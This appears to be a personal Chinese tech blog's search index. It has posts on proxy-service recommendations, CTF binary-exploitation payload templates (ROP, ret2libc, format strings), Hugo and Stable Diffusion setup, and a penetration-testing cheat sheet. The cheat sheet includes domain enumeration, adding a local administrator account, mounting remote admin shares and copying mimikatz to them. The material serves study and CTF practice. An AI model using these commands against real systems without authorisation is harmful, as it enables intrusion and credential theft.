[{"content":"科学上网方法 魔法上网： 参考这里 机场名称：魔戒 成立时间： 2020年 支付方式： 支付宝和USDT 优势： 便宜 不限制连接设备 稳定运行三年 不记录日志 套餐： 推荐套餐： 14.9元或42元计费流量套餐 推荐理由： 价格低，防止机场跑路，平均每月可以使用10G或36G流量，足够满足大部分轻度上网需求 网址： 网址1、网址2、网址3、网址4、网址5 机场名称：八戒 成立时间： 2022年1月 支付方式： 支付宝和微信 优势： 更稳定 不限制连接设备 不记录日志 流量计费套餐： 周期计费套餐： 推荐套餐： 29元或59元的流量计费套餐，或则9.9月周期计费套餐 推荐理由： 价格低，防止机场跑路，流量计费套餐平均每月可以使用9G或20G流量，足够满足大部分轻度上网需求。9.9包月套餐的70G流量对于大部分视频党也是够用。 网址： 网址1 机场名称：泰山 成立时间： 2022年6月 支付方式： 支付宝、微信、USDT 优势： 不限制连接设备 不记录日志 1天5G免费试用 流量计费套餐： 周期计费套餐（年付7折）： 推荐套餐： 25元不限时套餐，或则6元包月套餐年付 推荐理由： 价格低，防止机场跑路，流量计费套餐平均每月可以使用12.5G，足够满足大部分轻度上网需求。9.9包月套餐年付只要50元，其中64G流量对于大部分视频党也够用。 网址： 网址1、网址2、网址3、网址4 机场名称：养鸡场 成立时间： 2023年6月\n支付方式： 支付宝、微信\n优势：\n便宜 不限制连接设备 不记录日志 流量计费套餐： 周期计费套餐： 推荐套餐： 10元不限时长，或7元150G套餐\n推荐理由： 价格低，防止机场跑路。\n网址： 网址1\n","permalink":"https://ruralbee.github.io/posts/vpn/airplane/","summary":"科学上网方法 魔法上网： 参考这里 机场名称：魔戒 成立时间： 2020年 支付方式： 支付宝和USDT 优势： 便宜 不限制连接设备 稳定运行三年 不记录日志 套餐： 推荐套餐： 14.9元或42元计费流量套餐 推荐理由： 价格低，防止机场跑路，平均每月可以使用10G或36G流量，足够满足大部分轻度上网需求 网址： 网址1、网址2、网址3、网址4、网址5 机场名称：八戒 成立时间： 2022年1月 支付方式： 支付宝和微信 优势： 更稳定 不限制连接设备 不记录日志 流量计费套餐： 周期计费套餐： 推荐套餐： 29元或59元的流量计费套餐，或则9.9月周期计费套餐 推荐理由： 价格低，防止机场跑路，流量计费套餐平均每月可以使用9G或20G流量，足够满足大部分轻度上网需求。9.9包月套餐的70G流量对于大部分视频党也是够用。 网址： 网址1 机场名称：泰山 成立时间： 2022年6月 支付方式： 支付宝、微信、USDT 优势： 不限制连接设备 不记录日志 1天5G免费试用 流量计费套餐： 周期计费套餐（年付7折）： 推荐套餐： 25元不限时套餐，或则6元包月套餐年付 推荐理由： 价格低，防止机场跑路，流量计费套餐平均每月可以使用12.5G，足够满足大部分轻度上网需求。9.9包月套餐年付只要50元，其中64G流量对于大部分视频党也够用。 网址： 网址1、网址2、网址3、网址4 机场名称：养鸡场 成立时间： 2023年6月\n支付方式： 支付宝、微信\n优势：\n便宜 不限制连接设备 不记录日志 流量计费套餐： 周期计费套餐： 推荐套餐： 10元不限时长，或7元150G套餐\n推荐理由： 价格低，防止机场跑路。\n网址： 网址1","title":"2023年12月科学上网VPN机场推荐"},{"content":"栈溢出 防护方式 RELRO（ReLocation Read-Only） Partial RELRO: 部分开启堆栈地址随机化，got表可写 Full RELRO: 全部开启，got表不可写. Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表/内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。 Canary：栈溢出保护机制。这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出。 NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用。 PIE（Position Independent Executable）：地址无关可执行文件，是针对.text（代码段）、.data（数据段）、.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。 x64 Rop构造方式 payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr)，其中payload = 填充字节（buf+rbp） + retn汇编指令地址（可不加上） + pop rdi地址 + 构造的函数参数地址 + 构造的函数地址，有多个参数还需要添加其他的rop,x64的寄存器前六个是 rdi, rsi, rdx, rcx, r8, r9，其余直接放入栈中。\nret2libc 使用put函数获取libc地址的payload常见方式\npayload = cyclic(len(buf+rbp)) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) main_addr是下次跳转的函数地址\r使用write函数获取libc地址payload常见方式\npayload=cyclic(len(buf+rbp))+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(8)+p64(write_plt)+p64(main_addr) main_addr是下次跳转的函数地址\r构造shell的payload payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr) ret2shellcode pwntool生成shellcode代码shellcode=asm(shellcraft.sh()),但是要记得添加context(os='linux', arch='amd64') x86 Rop构造方式 单个函数payload=cyclic(len(buf+rbp))+p32(func_addr)+p32(0xdeadbeef)+p32(param)其中payload = 填充字节（buf+rbp）+ 函数地址 + 函数返回的地址 + 构造的函数参数（system输入的是字符串地址）。 两个函数payload=cyclic(len(buf+rbp))+p32(func1_addr)+p32(func2_addr)+p32(func1_param) + p32(func2_param)其中payload = 填充字节（buf+rbp）+ 函数1地址 + 函数2地址 + 函数1参数+ 函数2参数 ret2shellcode 使用mprotect构造可执行内存块 payload = cyclic(len(buf+rbp)) payload += p32(mprotect_addr) payload += p32(pop3_edx_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) + p32(其他恶意地址) pop3_edx_esi_ebx_ret为# pop esi ; pop ebx ; pop edx ; ret ret2libc 使用write函数泄露libc地址 使用plt表获取libc地址： payload=cyclic(len(buf+rbp))+p32(write_plt)+p32(return_addr)+p32(1)+p32(write_got)+p32(4) 调用system函数:\npayload=cyclic(len(buf+rbp))+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh) libc泄露代码 LibcSearcher方法 libc=LibcSearcher(\u0026#39;write\u0026#39;,write_addr) libc_base=write_addr-libc.dump(\u0026#39;write\u0026#39;) system=libc_base+libc.dump(\u0026#39;system\u0026#39;) sh=libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) LibcSearcherX方法 libc = LibcSearcherLocal/LibcSearcher(\u0026#34;write\u0026#34;,write_addr) libcbase = write_addr - libc.sym[\u0026#39;write\u0026#39;] system = libcbase + libc.sym[\u0026#39;system\u0026#39;] bin_sh = libcbase + libc.sym[\u0026#39;str_bin_sh\u0026#39;] 格式化字符串 格式化符号说明 %x 以十六进制打印，只能打印4字节，一般只用于32位 %p 打印目标地址，建议32位和64位都用这个 %s 打印地址内容 %c 打印单个字符 %hhn 写一字节 %hn 写两字节 %n 写四字节 %ln 32位写四字节，64位写八字节 %lln 写八字节 获取偏移（两种方式） 手动方式：输入aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p.....，依据结果获取偏移 动态调试：gdb启动程序打好断点后，查看输入数据写入的地址，输入fmtarg 0xaddress 即可获取偏移（offset）。 写入数据payload = p32(target_addr)+\u0026quot;%{}c%{}$n\u0026quot;.format(value-4, offset) target_addr是要写入的地址，value 是写入的大小，offset是1步骤中获得的结果。 常见命令 find find / -name flag ROPgadget ROPgadget --binary babyrop | grep \u0026quot;pop rdi\u0026quot; ROPgadget字符串搜索 ROPgadget --binary ciscn_2019_ne_5 --string sh 函数绕过 strlen使用\\00截断绕过 IDA Pro使用技巧 ctrl+s 查看.got.plt/.bss起始地址 常用函数 ssize_t write(int fd,const void*buf,size_t count);\r函数的fd为文件描述符write函数为1，count为写入字节，x86为4、x64为8 汇编 leave == mov ebp esp; pop ebp ret == pop eip ","permalink":"https://ruralbee.github.io/posts/ctf/pwn_stack/","summary":"栈溢出 防护方式 RELRO（ReLocation Read-Only） Partial RELRO: 部分开启堆栈地址随机化，got表可写 Full RELRO: 全部开启，got表不可写. Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表/内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。 Canary：栈溢出保护机制。这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出。 NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用。 PIE（Position Independent Executable）：地址无关可执行文件，是针对.text（代码段）、.data（数据段）、.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。 x64 Rop构造方式 payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr)，其中payload = 填充字节（buf+rbp） + retn汇编指令地址（可不加上） + pop rdi地址 + 构造的函数参数地址 + 构造的函数地址，有多个参数还需要添加其他的rop,x64的寄存器前六个是 rdi, rsi, rdx, rcx, r8, r9，其余直接放入栈中。\nret2libc 使用put函数获取libc地址的payload常见方式\npayload = cyclic(len(buf+rbp)) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) main_addr是下次跳转的函数地址\r使用write函数获取libc地址payload常见方式\npayload=cyclic(len(buf+rbp))+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(8)+p64(write_plt)+p64(main_addr) main_addr是下次跳转的函数地址\r构造shell的payload payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr) ret2shellcode pwntool生成shellcode代码shellcode=asm(shellcraft.sh()),但是要记得添加context(os='linux', arch='amd64') x86 Rop构造方式 单个函数payload=cyclic(len(buf+rbp))+p32(func_addr)+p32(0xdeadbeef)+p32(param)其中payload = 填充字节（buf+rbp）+ 函数地址 + 函数返回的地址 + 构造的函数参数（system输入的是字符串地址）。 两个函数payload=cyclic(len(buf+rbp))+p32(func1_addr)+p32(func2_addr)+p32(func1_param) + p32(func2_param)其中payload = 填充字节（buf+rbp）+ 函数1地址 + 函数2地址 + 函数1参数+ 函数2参数 ret2shellcode 使用mprotect构造可执行内存块 payload = cyclic(len(buf+rbp)) payload += p32(mprotect_addr) payload += p32(pop3_edx_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) + p32(其他恶意地址) pop3_edx_esi_ebx_ret为# pop esi ; pop ebx ; pop edx ; ret ret2libc 使用write函数泄露libc地址 使用plt表获取libc地址： payload=cyclic(len(buf+rbp))+p32(write_plt)+p32(return_addr)+p32(1)+p32(write_got)+p32(4) 调用system函数:","title":"CTF Pwn二进制总结"},{"content":"windows搭建方法 1. 下载hugo-extend和git hugo git 2. 启动博客系统 创建名字为firstsite的博客系统 hugo new site firstsite git init cd firstsite git submodule add --depth=1 https://github.com/adityatelange/hugo-PaperMod.git themes/PaperMod 博客调试与生成 hugo server # 博客调试 hugo -F --cleanDestinationDir #public生成博客 papermod使用 1. 文件基本配置 --- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; #标题 date: {{ .Date }} #创建时间 lastmod: {{ .Date }} #更新时间 author: [\u0026#34;Sulv\u0026#34;] #作者 categories: - 分类1 - 分类2 tags: - 标签1 - 标签2 description: \u0026#34;\u0026#34; #描述 weight: # 输入1可以顶置文章，用来给文章展示排序，不填就默认按时间排序 slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true #是否展示评论 showToc: true # 显示目录 TocOpen: true # 自动展开目录 hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等 disableShare: true # 底部不显示分享栏 showbreadcrumbs: true #顶部显示当前路径 cover: image: \u0026#34;\u0026#34; #图片路径：posts/tech/文章1/picture.png caption: \u0026#34;\u0026#34; #图片底部描述 alt: \u0026#34;\u0026#34; relative: false --- 2. 修改代码滑动条 将文件/themes/PaperMod/assets/css/common/main.css中的pre和code替换成以下内容 pre { position: relative; overflow-y: auto; max-height: 450px; } pre::-webkit-scrollbar { width: 12px; /* 修改滚动条宽度 */ } code { direction: ltr; font-family: consolas, Menlo, \u0026#34;PingFang SC\u0026#34;, \u0026#34;Microsoft YaHei\u0026#34;, sans-serif; } 配置文件config.yaml添加以下内容 markup: goldmark: renderer: unsafe: true highlight: noClasses: true codeFences: true guessSyntax: true 3. 目录放到左侧 首先找到目录 themes/PaperMod/layouts/partials/toc.html ，把之前的代码换成如下代码 {{- $headers := findRE \u0026#34;\u0026lt;h[1-6].*?\u0026gt;(.|\\n])+?\u0026lt;/h[1-6]\u0026gt;\u0026#34; .Content -}} {{- $has_headers := ge (len $headers) 1 -}} {{- if $has_headers -}} \u0026lt;aside id=\u0026#34;toc-container\u0026#34; class=\u0026#34;toc-container wide\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;toc\u0026#34;\u0026gt; \u0026lt;details {{if (.Param \u0026#34;TocOpen\u0026#34;) }} open{{ end }}\u0026gt; \u0026lt;summary accesskey=\u0026#34;c\u0026#34; title=\u0026#34;(Alt + C)\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;details\u0026#34;\u0026gt;{{- i18n \u0026#34;toc\u0026#34; | default \u0026#34;Table of Contents\u0026#34; }}\u0026lt;/span\u0026gt; \u0026lt;/summary\u0026gt; \u0026lt;div class=\u0026#34;inner\u0026#34;\u0026gt; {{- $largest := 6 -}} {{- range $headers -}} {{- $headerLevel := index (findRE \u0026#34;[1-6]\u0026#34; . 1) 0 -}} {{- $headerLevel := len (seq $headerLevel) -}} {{- if lt $headerLevel $largest -}} {{- $largest = $headerLevel -}} {{- end -}} {{- end -}} {{- $firstHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers 0) 1) 0)) -}} {{- $.Scratch.Set \u0026#34;bareul\u0026#34; slice -}} \u0026lt;ul\u0026gt; {{- range seq (sub $firstHeaderLevel $largest) -}} \u0026lt;ul\u0026gt; {{- $.Scratch.Add \u0026#34;bareul\u0026#34; (sub (add $largest .) 1) -}} {{- end -}} {{- range $i, $header := $headers -}} {{- $headerLevel := index (findRE \u0026#34;[1-6]\u0026#34; . 1) 0 -}} {{- $headerLevel := len (seq $headerLevel) -}} {{/* get id=\u0026#34;xyz\u0026#34; */}} {{- $id := index (findRE \u0026#34;(id=\\\u0026#34;(.*?)\\\u0026#34;)\u0026#34; $header 9) 0 }} {{- /* strip id=\u0026#34;\u0026#34; to leave xyz, no way to get regex capturing groups in hugo */ -}} {{- $cleanedID := replace (replace $id \u0026#34;id=\\\u0026#34;\u0026#34; \u0026#34;\u0026#34;) \u0026#34;\\\u0026#34;\u0026#34; \u0026#34;\u0026#34; }} {{- $header := replaceRE \u0026#34;\u0026lt;h[1-6].*?\u0026gt;((.|\\n])+?)\u0026lt;/h[1-6]\u0026gt;\u0026#34; \u0026#34;$1\u0026#34; $header -}} {{- if ne $i 0 -}} {{- $prevHeaderLevel := index (findRE \u0026#34;[1-6]\u0026#34; (index $headers (sub $i 1)) 1) 0 -}} {{- $prevHeaderLevel := len (seq $prevHeaderLevel) -}} {{- if gt $headerLevel $prevHeaderLevel -}} {{- range seq $prevHeaderLevel (sub $headerLevel 1) -}} \u0026lt;ul\u0026gt; {{/* the first should not be recorded */}} {{- if ne $prevHeaderLevel . -}} {{- $.Scratch.Add \u0026#34;bareul\u0026#34; . -}} {{- end -}} {{- end -}} {{- else -}} \u0026lt;/li\u0026gt; {{- if lt $headerLevel $prevHeaderLevel -}} {{- range seq (sub $prevHeaderLevel 1) -1 $headerLevel -}} {{- if in ($.Scratch.Get \u0026#34;bareul\u0026#34;) . -}} \u0026lt;/ul\u0026gt; {{/* manually do pop item */}} {{- $tmp := $.Scratch.Get \u0026#34;bareul\u0026#34; -}} {{- $.Scratch.Delete \u0026#34;bareul\u0026#34; -}} {{- $.Scratch.Set \u0026#34;bareul\u0026#34; slice}} {{- range seq (sub (len $tmp) 1) -}} {{- $.Scratch.Add \u0026#34;bareul\u0026#34; (index $tmp (sub . 1)) -}} {{- end -}} {{- else -}} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{- end -}} {{- end -}} {{- end -}} {{- end }} \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;#{{- $cleanedID -}}\u0026#34; aria-label=\u0026#34;{{- $header | plainify -}}\u0026#34;\u0026gt;{{- $header | safeHTML -}}\u0026lt;/a\u0026gt; {{- else }} \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;#{{- $cleanedID -}}\u0026#34; aria-label=\u0026#34;{{- $header | plainify -}}\u0026#34;\u0026gt;{{- $header | safeHTML -}}\u0026lt;/a\u0026gt; {{- end -}} {{- end -}} \u0026lt;!-- {{- $firstHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers 0) 1) 0)) -}} --\u0026gt; {{- $firstHeaderLevel := $largest }} {{- $lastHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers (sub (len $headers) 1)) 1) 0)) }} \u0026lt;/li\u0026gt; {{- range seq (sub $lastHeaderLevel $firstHeaderLevel) -}} {{- if in ($.Scratch.Get \u0026#34;bareul\u0026#34;) (add . $firstHeaderLevel) }} \u0026lt;/ul\u0026gt; {{- else }} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{- end -}} {{- end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/details\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; \u0026lt;script\u0026gt; let activeElement; let elements; window.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function (event) { checkTocPosition(); elements = document.querySelectorAll(\u0026#39;h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]\u0026#39;); // Make the first header active activeElement = elements[0]; const id = encodeURI(activeElement.getAttribute(\u0026#39;id\u0026#39;)).toLowerCase(); document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.add(\u0026#39;active\u0026#39;); }, false); window.addEventListener(\u0026#39;resize\u0026#39;, function(event) { checkTocPosition(); }, false); window.addEventListener(\u0026#39;scroll\u0026#39;, () =\u0026gt; { // Check if there is an object in the top half of the screen or keep the last item active activeElement = Array.from(elements).find((element) =\u0026gt; { if ((getOffsetTop(element) - window.pageYOffset) \u0026gt; 0 \u0026amp;\u0026amp; (getOffsetTop(element) - window.pageYOffset) \u0026lt; window.innerHeight/2) { return element; } }) || activeElement elements.forEach(element =\u0026gt; { const id = encodeURI(element.getAttribute(\u0026#39;id\u0026#39;)).toLowerCase(); if (element === activeElement){ document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.add(\u0026#39;active\u0026#39;); } else { document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.remove(\u0026#39;active\u0026#39;); } }) }, false); const main = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--article-width\u0026#39;), 10); const toc = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--toc-width\u0026#39;), 10); const gap = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--gap\u0026#39;), 10); function checkTocPosition() { const width = document.body.scrollWidth; if (width - main - (toc * 2) - (gap * 4) \u0026gt; 0) { document.getElementById(\u0026#34;toc-container\u0026#34;).classList.add(\u0026#34;wide\u0026#34;); } else { document.getElementById(\u0026#34;toc-container\u0026#34;).classList.remove(\u0026#34;wide\u0026#34;); } } function getOffsetTop(element) { if (!element.getClientRects().length) { return 0; } let rect = element.getBoundingClientRect(); let win = element.ownerDocument.defaultView; return rect.top + win.pageYOffset; } \u0026lt;/script\u0026gt; {{- end }} 确认文件 themes/PaperMod/layouts/_default/single.html中包含以下代码 {{- if (.Param \u0026#34;ShowToc\u0026#34;) }} {{- partial \u0026#34;toc.html\u0026#34; . }} {{- end }} 修改css/extended/blank.css文件，修改为以下代码 :root { --nav-width: 1380px; --article-width: 650px; --toc-width: 300px; } .toc { margin: 0 2px 40px 2px; border: 1px solid var(--border); background: var(--entry); border-radius: var(--radius); padding: 0.4em; } .toc-container.wide { position: absolute; height: 100%; border-right: 1px solid var(--border); left: calc((var(--toc-width) + var(--gap)) * -1); top: calc(var(--gap) * 2); width: var(--toc-width); } .wide .toc { position: sticky; top: var(--gap); border: unset; background: unset; border-radius: unset; width: 100%; margin: 0 2px 40px 2px; } .toc details summary { cursor: zoom-in; margin-inline-start: 20px; padding: 12px 0; } .toc details[open] summary { font-weight: 500; } .toc-container.wide .toc .inner { margin: 0; } .active { font-size: 110%; font-weight: 600; } .toc ul { list-style-type: circle; } .toc .inner { margin: 0 0 0 20px; padding: 0px 15px 15px 20px; font-size: 16px; /*目录显示高度*/ max-height: 83vh; overflow-y: auto; } .toc .inner::-webkit-scrollbar-thumb { /*滚动条*/ background: var(--border); border: 7px solid var(--theme); border-radius: var(--radius); } .toc li ul { margin-inline-start: calc(var(--gap) * 0.5); list-style-type: none; } .toc li { list-style: none; font-size: 0.95rem; padding-bottom: 5px; } .toc li a:hover { color: var(--secondary); } 参考教程 ","permalink":"https://ruralbee.github.io/posts/other/hugo/","summary":"windows搭建方法 1. 下载hugo-extend和git hugo git 2. 启动博客系统 创建名字为firstsite的博客系统 hugo new site firstsite git init cd firstsite git submodule add --depth=1 https://github.com/adityatelange/hugo-PaperMod.git themes/PaperMod 博客调试与生成 hugo server # 博客调试 hugo -F --cleanDestinationDir #public生成博客 papermod使用 1. 文件基本配置 --- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; #标题 date: {{ .Date }} #创建时间 lastmod: {{ .Date }} #更新时间 author: [\u0026#34;Sulv\u0026#34;] #作者 categories: - 分类1 - 分类2 tags: - 标签1 - 标签2 description: \u0026#34;\u0026#34; #描述 weight: # 输入1可以顶置文章，用来给文章展示排序，不填就默认按时间排序 slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true #是否展示评论 showToc: true # 显示目录 TocOpen: true # 自动展开目录 hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等 disableShare: true # 底部不显示分享栏 showbreadcrumbs: true #顶部显示当前路径 cover: image: \u0026#34;\u0026#34; #图片路径：posts/tech/文章1/picture.","title":"Hugo静态网站搭建"},{"content":"stable diffusion安装 Windows 安装 一、下载conda conda下载地址 二、升级驱动 Geforce Experience 三、conda安装环境 安装git\nconda install git 查看驱动支持的cuda版本\nnvidia-smi onda环境能支持的cudnn最高版本\nconda search cudnn 创建pytorch虚拟环境 conda create -n pytorch python=3.10 conda activate pytorch # https://pytorch.org/get-started/locally/ conda install pytorch==2.0.1 torchvision==0.15.2 torchaudio==2.0.2 pytorch-cuda=11.7 -c pytorch -c nvidia conda install cudnn=8.9.2.26 #版本为上述查询的结果 四、conda安装环境 stable-diffusion下载\ngit clone https://github.com/AUTOMATIC1111/stable-diffusion-webui stable-diffusion依赖安装 conda create --name sdw --clone pytorch conda activate sdw pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ cd stable-diffusion-webui pip install -r requirements.txt pip install clip pip install open_clip_torch pip install xformer 下载模型 模型下载地址（无需科学上网） https://aigccafe.net/ 模型存放路径\nmodels\\Stable-diffusion 下载openai库 https://huggingface.co/openai/clip-vit-large-patch14/tree/main 存放路径stable-diffusion-webui/openai如果不存在就创建一个openai文件夹 修改启动脚本 @echo off set PYTHON= set GIT= set VENV_DIR=- set COMMANDLINE_ARGS=--lowvram --precision full --no-half call webui.bat 启动脚本程序 ./webui-user.bat 参考文章 https://zhuanlan.zhihu.com/p/632376598 ","permalink":"https://ruralbee.github.io/posts/ai/stablediffusion/","summary":"stable diffusion安装 Windows 安装 一、下载conda conda下载地址 二、升级驱动 Geforce Experience 三、conda安装环境 安装git\nconda install git 查看驱动支持的cuda版本\nnvidia-smi onda环境能支持的cudnn最高版本\nconda search cudnn 创建pytorch虚拟环境 conda create -n pytorch python=3.10 conda activate pytorch # https://pytorch.org/get-started/locally/ conda install pytorch==2.0.1 torchvision==0.15.2 torchaudio==2.0.2 pytorch-cuda=11.7 -c pytorch -c nvidia conda install cudnn=8.9.2.26 #版本为上述查询的结果 四、conda安装环境 stable-diffusion下载\ngit clone https://github.com/AUTOMATIC1111/stable-diffusion-webui stable-diffusion依赖安装 conda create --name sdw --clone pytorch conda activate sdw pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ cd stable-diffusion-webui pip install -r requirements.","title":"Stable Diffusion安装"},{"content":"内网渗透 Kali 探测命令 netdiscover\nnetdiscover -i eth0 -r 192.168.111.0/24 探测网卡下同段存在主机 namp\nnmap 192.168.111.129` # 探测存在的服务 nmap -T4 -sC -sV 192.168.1.8 -p: 指定端口扫描范围 -F：扫描比缺省少的端口 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -O：探测指定IP的相关数据。 -sP：主机探测 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 --dns-servers \u0026lt;serv1[,serv2],...\u0026gt;: 指定DNS 服务器 --system-dns:调用系统的DNS服务器 --traceroute：显示追踪到目标的路径 -sS/sT/sA/sW/sM:TCP扫描 -sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 -sT是全连接扫描会和服务器建立完整的三次握手，效率低 -sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 -sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 -sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b \u0026lt;FTP relay host\u0026gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 Linux 常见命令 uname -a # 获取所有版本信息 uname -m # 获取Linux内核架构 cat /proc/version # 获取内核信息 cat /etc/*-release # 发布信息 cat /etc/issue # 发布信息 hostname # 获取主机名 cat /etc/passwd # 列出系统所有用户 cat /etc/group # 列出系统所有组 w # 查看目前登录的用户 whoami # 查看当前用户 id # 查看当前用户信息 sudo -l # 列出目前用户可执行与无法执行的指令 ps aux # 查看进程信息 ls -la /etc/cron* # 查看计划任务 ifconfig -a # 列出网络接口信息 cat /etc/network/interfaces # 列出网络接口信息 arp -a # 查看系统arp表 route # 打印路由信息 netstat -anplt # 打印本地端口开放信息 iptables -L # 列出iptable的配置规则 nohup 命令 \u0026amp; #后台运行 Windows 初步收集 查看基本信息命令 ipconfig /all # 查看本机ip，所在域 route print # 打印路由信息 net view # 查看局域网内其他主机名 net view /domain # 查看主域信息 arp -a # 查看arp缓存 net start # 查看开启了哪些服务 net share # 查看开启了哪些共享 net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 echo %PROCESSOR_ARCHITECTURE% // 查看系统体系结构 systeminfo // 查看操作系统信息 nslookup god.org\t#nslookup直接解析域名服务器 net user # 查看本机用户列表 net user /domain # 查看域用户 net localgroup administrators # 查看本地管理员组（通常会有域用户） net computers # 查看连接的电脑 net view /domain # 查看有几个域 net user \u0026#34;用户名\u0026#34; /domain # 获取指定域用户的信息 net group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group \u0026#34;组名\u0026#34; /domain # 查看域中某工作组 net group \u0026#34;domain admins\u0026#34; /domain # 查看域管理员的名字 net group \u0026#34;domain computers\u0026#34; /domain # 查看域中的其他主机名 net group \u0026#34;doamin controllers\u0026#34; /domain # 查看域控制器（可能有多台） net group \u0026#34;Enterprise Admins\u0026#34; /domain // 查看域管理员组 net accounts /domain #查看域密码信息 nltest /domain_trusts #查看域信任信息 net添加用户 net user \u0026#34;username\u0026#34; \u0026#34;password\u0026#34; /add #添加账户名和密码的用户, 不用双引号也可以 net localgroup administrators \u0026#34;username\u0026#34; /add #将用户添加到本地管理员中 net共享盘符连接 net use # 查看与本机的共享链接 net view \\\\IP #查看远程主机开启的默认共享 net share # 查看本机开启了哪些共享 net share ipc$ # 开启本机ipc共享 net share c$ # 开启本机c盘共享 net use \\\\IP\\ipc$ \u0026#34;password\u0026#34; /user:\u0026#34;username\u0026#34; #建立空连接 net use z: \\\\IP\\c$ \u0026#34;password\u0026#34; /user:\u0026#34;username\u0026#34; #建立共享盘符 net use \\\\IP\\ipc$ /del #删除空连接 net use z: /del #删除本机映射的z盘 net use * /del #删除本机所有映射和IPC$连接 dir \\\\192.168.xx.xx\\c$\\user # 查看192.168.xx.xx c盘user目 录下的文件 copy mimikatz.exe \\\\192.168.138.138\\c$ 